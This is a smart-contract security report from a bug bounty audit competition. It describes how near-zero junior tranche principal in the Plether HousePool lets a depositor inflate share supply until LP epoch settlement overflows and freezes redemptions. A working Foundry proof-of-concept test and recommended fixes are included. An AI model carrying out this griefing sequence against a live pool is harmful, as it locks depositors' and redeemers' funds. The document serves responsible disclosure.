# \#97628 [SC-High] Near-zero junior principal lets any depositor overflow the junior deposit quote and freeze all LP epoch settlement, including senior redemptions

**Submitted on Nov 2nd 2026 at 14:54:58 UTC by @Tekmer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97628
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief / Intro
HousePool defers junior deposit activation only when junior principal is exactly zero. When the senior coupon has drained junior
principal to a few atoms (but not zero), any user can activate deposits at that near-zero price in successive hourly epochs, inflating
the junior share supply by roughly d/p per round. After about 16 rounds the next epoch's deposit quote exceeds 2^256 and
`settleLpEpoch` reverts with an arithmetic panic. Because senior and junior redemption funding run in the same transaction before the
deposit phase, every LP settlement reverts: matured senior and junior redemptions are not funded, pending deposits are not activated,
and matured junior deposits cannot be cancelled. The freeze lasts until the coupon takes junior principal to exactly zero; the attacker
chooses that length (48 h in the PoC) for about 0.022% of senior TVL per day, paid to senior as coupon.

## Vulnerability Details
1. **Exact-zero deferral only.** Junior activation is skipped only when pricing assets are exactly zero:
   `bool juniorActivationDeferred = juniorDepositPhase.pricingAssets == 0 && juniorDepositPhase.pricingSupply != 0;`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L917). The request admission gate uses the same exact-zero test (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L494-L498).
   A principal of 1 atom passes both.
2. **Unbounded share price.** The quote is `mulDiv(netAssets, pricingSupply + VIRTUAL_SHARES, pricingAssets + assets + 1 - netAssets)`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L1407-L1409); with no fee the denominator is `pricingAssets + 1`. At a principal p of a few atoms a deposit d
   mints about `supply * d / p` shares. Nothing bounds this: the 1 USDG minimum deposit is met (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L176), the 3-decimal virtual offset is negligible
   once supply is large, and there is no minimum assets-per-share or mint cap.
3. **The attacker chooses p.** The senior coupon drains junior principal continuously
   (`couponPaid = min(couponDue, juniorPrincipal)`, https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol#L76), and `settleLpEpoch`
   is permissionless (directly while no position is open, otherwise through `OrderRouter.settleLpEpoch`) and reconciles first (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835). A depositor therefore settles at the second when p is in [1, coupon per second]
   (about 2,539 atoms at 1M USDG senior) and activates at that price. Repeating once per epoch multiplies supply each time; in the PoC 16
   rounds take junior supply from 1.6e14 to 3.0e75.
4. **Overflow takes exits down with it.** The next deposit epoch's quote `vault.quoteDepositFromState(...)`
   (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1046-L1048) overflows in `Math.mulDiv` (Panic 0x11). It runs inside `_settleLpEpoch` after senior redemption
   funding (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L854-L856) and junior redemption funding (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L882-L884), so the whole call reverts,
   whether reached directly or through `OrderRouter.settleLpEpoch`.
5. **No unprivileged recovery.** A larger deposit makes the overflow worse; donations are not counted until the owner admits excess.
   The freeze ends only when the coupon takes junior principal to exactly zero (then deferral applies and junior is wiped), or while the
   owner/pauser keeps the pool paused.

## Impact Details
- Every `settleLpEpoch` reverts for the attacker-chosen window (172,850 s, about 48 hours, in the PoC): **matured senior redemptions are not funded**
  (senior LPs cannot exit), junior redemptions are not funded, and senior and junior deposits are not activated.
- **Victims' matured junior deposits are locked**: `cancelPendingDeposit` reverts `TrancheVault__DepositEpochAlreadyActive` for the
  whole window, including while the owner has paused the pool.
- Owner/pauser `pause()` lets redemption funding resume (activation is skipped while paused), but deposits stay locked, and `unpause()`
  restores the freeze until junior reaches zero.
- Attacker cost: 577.3 USDG spent at the 48-hour target (357.9 USDG at 24 hours; all of it paid to senior as coupon) plus 8,914.6 USDG parked in the poisoned epoch (8,971 at 24 hours) and refunded after
  the window. The window length scales with the final round's deposit (about 219 USDG per day per 1M USDG of senior). No profit motive:
  griefing / temporary freezing.

**Precondition:** junior principal must already be near zero while senior is unimpaired, e.g. after trader PnL has
nearly wiped junior and the coupon is finishing it. The attacker cannot create this state; it arises in exactly the stress scenario in
which senior LPs most need to exit. The PoC reaches it by seeding junior with 200 USDG against 1,001,000 USDG senior and the test base's
senior share cap, then warping about 22 hours of coupon; the code path does not depend on those values.

## References
- HousePool.sol L917 (deferral), L494-L498 (admission gate), L835 (reconcile first), L854-L856 and L882-L884 (redemption funding in
  the same call), L1046-L1048 (deposit quote): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- HousePool.sol L176 (`MIN_TRANCHE_DEPOSIT_ASSETS`); HousePoolWaterfallAccountingLib.sol L76 (coupon drain)
- TrancheVault.sol L1398-L1410 (`quoteDepositFromState`): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- Known-issue check: SECURITY.md, ACCOUNTING_SPEC.md (lines 307-308) and the audits cover only the exact-zero wipe; the AI audit's
  LOW-72 is the exact-zero quote shown to integrators and LOW-58 is an unrelated overflow. The repository's regression tests for
  this area are all exact-zero cases: `test_ZeroPrincipalRecapitalizationCashMustNotBeCapturableByNextJuniorDepositor`,
  `test_WipedTrancheRejectsNewDeposits` and `test_OneDollarDepositCannotRecapWipedTranche`
  (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/TrancheRecoveryBehavior.t.sol#L234, #L331, #L380), and
  `test_ZeroJuniorNavRefundsRedemptionAndDefersPendingDeposit` (https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/invariant/properties/PerpMixedLpLifecycle.t.sol#L132).
  Nothing covers a near-zero principal.


## Proof of Concept

Foundry test using the repository's `BasePerpTest`. Save as `packages/perps/test/poc/JuniorNearWipeDepositOverflow.t.sol` and run
from `packages/perps`:

```bash
FOUNDRY_TEST=test/poc forge test --offline --skip script --match-path 'test/poc/*' -vv
```

Expected: 3 tests pass.
- `test_PoC_NearWipeDepositsOverflowFreezesLpSettlement`: every `settleLpEpoch` during the window reverts with Panic(0x11); the
  senior redemption stays unfunded and the victim cannot cancel.
- `test_PoC_OwnerPauseRestoresRedemptionFundingOnly`: pause funds redemptions but the victim still cannot cancel; unpause re-freezes.
- `test_PoC_FreezeEndsOnlyWhenCouponWipesJunior`: settlement resumes only when junior principal reaches zero (window 172,850 s).

<details><summary>JuniorNearWipeDepositOverflow.t.sol</summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC: junior deposit activation is deferred only at exactly zero junior principal. While the senior
// coupon drains junior principal, an unprivileged depositor can time permissionless settlements to the last second
// before the wipe (1..c atoms left), so each activation multiplies junior share supply by about d / p. After enough
// rounds the next deposit quote overflows inside HousePool.settleLpEpoch and every LP epoch settlement reverts,
// including funding of matured senior redemptions.

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {console2} from "forge-std/console2.sol";

contract JuniorNearWipeDepositOverflowPoC is BasePerpTest {

    address internal seniorLp = address(0xA11CE);
    address internal attacker = address(0xBAD);
    address internal victim = address(0xB0B);

    uint256 internal constant SENIOR_ASSETS = 1_000_000e6;
    uint256 internal constant VICTIM_DEPOSIT = 1000e6;
    uint256 internal constant FREEZE_TARGET = 2 days; // chosen by the attacker; cost is the coupon over this window
    uint256 internal constant POISON_CAP = 50_000e6; // attacker capital parked in the poison epoch (refunded later)
    uint256 internal constant SENIOR_REDEEM_SHARES_DIVISOR = 10; // senior LP redeems 10% of its shares
    uint256 internal constant BPS_YEAR = 10_000 * 31_536_000;
    uint256 internal constant MAX_ROUNDS = 40;

    struct Poisoned {
        uint256 maturity;
        uint256 depositEpoch;
        uint256 victimRequestId;
        uint256 seniorRedeemRequestId;
        uint256 seniorRedeemShares;
        uint256 rounds;
        uint256 attackerSpent;
        uint256 attackerPoisonDeposit;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 200e6;
    }

    function setUp() public override {
        super.setUp();
        _fundSenior(seniorLp, SENIOR_ASSETS);
    }

    // ------------------------------------------------------------------
    // helpers
    // ------------------------------------------------------------------

    /// @dev Stand-in for the keeper/Pyth mark refresh that BasePerpTest._fundTrancheAsync also uses.
    function _refreshMark() internal {
        uint256 markPrice = engine.lastMarkPrice();
        vm.prank(address(router));
        engine.updateMarkPrice(markPrice == 0 ? 1e8 : markPrice, SafeCast.toUint64(block.timestamp));
    }

    function _couponPerSecond() internal view returns (uint256) {
        return pool.seniorPrincipal() * pool.seniorRateBps() / BPS_YEAR;
    }

    /// @dev Junior principal the next reconcile would leave at `t` (coupon only; no positions, no revenue).
    function _juniorAt(
        uint256 t
    ) internal view returns (uint256) {
        uint256 j = pool.juniorPrincipal();
        uint256 ck = pool.lastSeniorCouponCheckpointTime();
        if (t <= ck) {
            return j;
        }
        uint256 coupon = pool.seniorPrincipal() * pool.seniorRateBps() * (t - ck) / BPS_YEAR;
        return coupon >= j ? 0 : j - coupon;
    }

    /// @dev Last second before the coupon takes the stored junior principal to zero, and the principal left then.
    function _nearWipeTime() internal view returns (uint256 t, uint256 p) {
        uint256 j = pool.juniorPrincipal();
        uint256 sr = pool.seniorPrincipal() * pool.seniorRateBps();
        uint256 dt = (j * BPS_YEAR - 1) / sr;
        t = pool.lastSeniorCouponCheckpointTime() + dt;
        p = j - (sr * dt) / BPS_YEAR;
    }

    function _quoteOverflows(
        uint256 assets,
        uint256 pricingAssets,
        uint256 supply
    ) internal view returns (bool) {
        try juniorVault.quoteDepositFromState(assets, pricingAssets, supply, 0) returns (uint256 q) {
            return q > type(uint256).max - supply;
        } catch {
            return true;
        }
    }

    function _requestJuniorDeposit(
        address lp,
        uint256 assets
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), assets);
        requestId = juniorVault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
    }

    function _trySettle() internal returns (bool ok, bytes memory ret) {
        (ok, ret) = address(pool).call(abi.encodeWithSelector(pool.settleLpEpoch.selector, uint256(0), uint256(0)));
    }

    /// @dev Drives the public lifecycle until the next junior deposit epoch can no longer be activated.
    function _driveToPoison() internal returns (Poisoned memory r) {
        // Precondition: junior is being drained by the senior coupon (no positions, no revenue). Wait, as any
        // observer can, until the epoch before the one in which the coupon would wipe junior.
        (uint256 firstT,) = _nearWipeTime();
        uint256 requestAt = (firstT / 1 hours - 1) * 1 hours + 60;
        uint256 poisonDeposit;
        assertGt(requestAt, block.timestamp, "seed must not drain before the attack window");
        vm.warp(requestAt);
        _refreshMark();

        for (uint256 round = 1; round <= MAX_ROUNDS; ++round) {
            (uint256 t, uint256 p) = _nearWipeTime();
            (uint256 reqEpoch,) = juniorVault.getRequestEpochWindow();
            uint256 maturity = juniorVault.depositEpochStart(reqEpoch);
            assertGe(t, maturity, "junior must still be positive when the epoch matures");
            uint256 supply = juniorVault.accruedTotalSupply();

            // Poison when a deposit epoch maturing now could not be activated at any second before the wipe.
            if (poisonDeposit != 0) {
                assertTrue(
                    _quoteOverflows(poisonDeposit, _juniorAt(maturity), supply), "attacker deposit alone overflows"
                );
                _requestJuniorDeposit(attacker, poisonDeposit);
                r.attackerPoisonDeposit = poisonDeposit; // refundable once the coupon wipes junior
                r.victimRequestId = _requestJuniorDeposit(victim, VICTIM_DEPOSIT);
                r.depositEpoch = reqEpoch;
                assertEq(r.victimRequestId, reqEpoch, "victim and attacker share the poisoned epoch");

                r.seniorRedeemShares = seniorVault.balanceOf(seniorLp) / SENIOR_REDEEM_SHARES_DIVISOR;
                vm.prank(seniorLp);
                r.seniorRedeemRequestId = seniorVault.requestRedeem(r.seniorRedeemShares, seniorLp, seniorLp);
                assertEq(r.seniorRedeemRequestId, reqEpoch, "senior redemption matures in the poisoned epoch");

                r.maturity = maturity;
                r.rounds = round - 1;
                vm.warp(maturity);
                _refreshMark();
                console2.log("poison epoch", reqEpoch);
                console2.log("junior supply at poison", supply);
                console2.log("junior principal at maturity", _juniorAt(maturity));
                console2.log("attacker rounds", r.rounds);
                console2.log("attacker assets spent (atoms)", r.attackerSpent);
                console2.log("attacker refundable poison deposit (atoms)", r.attackerPoisonDeposit);
                return r;
            }

            // Size the next attacker deposit so junior survives until 60 s after the following epoch matures.
            uint256 nextMaturity = (t % 1 hours) < (1 hours - 5 minutes) ? (t / 1 hours + 1) * 1 hours
                                                                         : (t / 1 hours + 2) * 1 hours;
            uint256 d = _couponPerSecond() * (nextMaturity + 60 - t);
            if (d < pool.minTrancheDepositAssets()) {
                d = pool.minTrancheDepositAssets();
            }
            // Final round: a larger activation D sets the freeze length (D / coupon rate). The poison epoch then needs
            // assets A of about 2^256 * p / supplyBefore, independent of D.
            {
                uint256 dFinal = d + _couponPerSecond() * FREEZE_TARGET;
                if (!_quoteOverflows(dFinal, p, supply)) {
                    uint256 supplyAfter = supply + juniorVault.quoteDepositFromState(dFinal, p, supply, 0);
                    uint256 juniorAtNextMaturity = p + dFinal - _couponPerSecond() * (nextMaturity - t + 1);
                    uint256 aReq = Math.mulDiv(
                        type(uint256).max - supplyAfter, juniorAtNextMaturity + 1, supplyAfter + 1000, Math.Rounding.Ceil
                    );
                    uint256 aFinal = aReq + aReq / 10 + 1;
                    if (aFinal <= POISON_CAP && _quoteOverflows(aFinal, juniorAtNextMaturity, supplyAfter)) {
                        d = dFinal;
                        poisonDeposit = aFinal;
                    }
                }
            }
            assertFalse(_quoteOverflows(d, p, supply), "intermediate round must activate");
            _requestJuniorDeposit(attacker, d);
            r.attackerSpent += d;

            // Permissionless no-position settlement at the chosen second.
            vm.warp(t);
            _refreshMark();
            (, uint256 pendingJunior) = pool.getPendingDepositTrancheState();
            assertEq(pendingJunior, p, "junior pricing assets at settlement");
            IHousePool.LpEpochSettlementResult memory res = _settleLpEpochForTest();
            assertEq(res.juniorDepositAssets, d, "attacker deposit activated");

            console2.log("round", round);
            console2.log("  pricing junior principal p", p);
            console2.log("  deposit d", d);
            console2.log("  junior supply after", juniorVault.totalSupply());
        }
        revert("did not reach poison");
    }

    // ------------------------------------------------------------------
    // tests
    // ------------------------------------------------------------------

    function test_PoC_NearWipeDepositsOverflowFreezesLpSettlement() public {
        Poisoned memory r = _driveToPoison();
        bytes memory panic11 = abi.encodeWithSignature("Panic(uint256)", uint256(0x11));

        (uint256 tZero,) = _nearWipeTime();
        tZero += 1; // first second at which the coupon has taken junior to exactly zero
        console2.log("freeze length while junior > 0 (s)", tZero - r.maturity);

        uint256[4] memory probes = [r.maturity, r.maturity + 1 hours, (r.maturity + tZero) / 2, tZero - 1];
        for (uint256 i; i < probes.length; ++i) {
            vm.warp(probes[i]);
            _refreshMark();
            assertGt(_juniorAt(probes[i]), 0, "junior still positive");
            (bool ok, bytes memory ret) = _trySettle();
            assertFalse(ok, "every LP epoch settlement reverts");
            assertEq(ret, panic11, "arithmetic overflow panic 0x11");
            console2.log("settleLpEpoch reverted at t =", probes[i]);
            console2.logBytes(ret);

            assertEq(
                seniorVault.claimableRedeemRequest(r.seniorRedeemRequestId, seniorLp),
                0,
                "matured senior redemption stays unfunded"
            );
            assertEq(
                seniorVault.pendingRedeemRequest(r.seniorRedeemRequestId, seniorLp),
                r.seniorRedeemShares,
                "senior shares stay escrowed"
            );

            vm.prank(victim);
            vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
            juniorVault.cancelPendingDeposit(r.victimRequestId);
        }
    }

    function test_PoC_OwnerPauseRestoresRedemptionFundingOnly() public {
        Poisoned memory r = _driveToPoison();
        bytes memory panic11 = abi.encodeWithSignature("Panic(uint256)", uint256(0x11));

        (bool ok, bytes memory ret) = _trySettle();
        assertFalse(ok, "frozen before pause");
        assertEq(ret, panic11);

        pool.pause(); // owner / pauser only
        IHousePool.LpEpochSettlementResult memory res = pool.settleLpEpoch(0, 0);
        assertGt(res.seniorFundedAssets, 0, "pause lets senior redemption funding through");
        assertTrue(res.entriesDeferred, "deposit activation skipped while paused");
        assertGt(
            seniorVault.claimableRedeemRequest(r.seniorRedeemRequestId, seniorLp), 0, "senior redemption now claimable"
        );

        // Pause does not unlock the victim's matured junior deposit.
        vm.prank(victim);
        vm.expectRevert(TrancheVault.TrancheVault__DepositEpochAlreadyActive.selector);
        juniorVault.cancelPendingDeposit(r.victimRequestId);

        // Unpausing while junior is still positive brings the freeze back.
        vm.warp(block.timestamp + 1 hours);
        _refreshMark();
        assertGt(_juniorAt(block.timestamp), 0, "junior still positive");
        pool.unpause();
        (ok, ret) = _trySettle();
        assertFalse(ok, "freeze resumes after unpause");
        assertEq(ret, panic11);
    }

    function test_PoC_FreezeEndsOnlyWhenCouponWipesJunior() public {
        Poisoned memory r = _driveToPoison();
        (uint256 tLast,) = _nearWipeTime();
        vm.warp(tLast + 1);
        _refreshMark();
        assertEq(_juniorAt(block.timestamp), 0, "coupon has taken junior to zero");

        IHousePool.LpEpochSettlementResult memory res = pool.settleLpEpoch(0, 0);
        assertGt(res.seniorFundedAssets, 0, "senior redemption funded once junior is wiped");
        assertEq(res.juniorDepositAssets, 0, "junior activation deferred at zero principal");
        assertTrue(res.entriesDeferred);

        uint256 before = settlementToken.balanceOf(victim);
        vm.prank(victim);
        juniorVault.cancelPendingDeposit(r.victimRequestId);
        assertEq(settlementToken.balanceOf(victim) - before, VICTIM_DEPOSIT, "victim refunded only after the wipe");
        console2.log("freeze ended at t =", block.timestamp);
        console2.log("freeze length (s)", block.timestamp - r.maturity);
    }

}
```
</details>

## Recommendation
1. Treat a dust junior NAV as wiped for both admission and activation: defer activation (and allow cancellation) when the pricing
   principal is below a floor (for example the minimum tranche deposit) or when the implied price falls below a minimum assets-per-share.
2. Do not let an entry-pricing failure block exits: compute the deposit quote on a non-reverting path inside `_settleDepositPhase`
   (bounds-check supply plus quote, or try/catch the vault call) and reject or defer that epoch instead of reverting the settlement;
   or settle deposit activation separately from redemption funding.
3. Optionally cap the shares minted by one activation relative to existing supply.

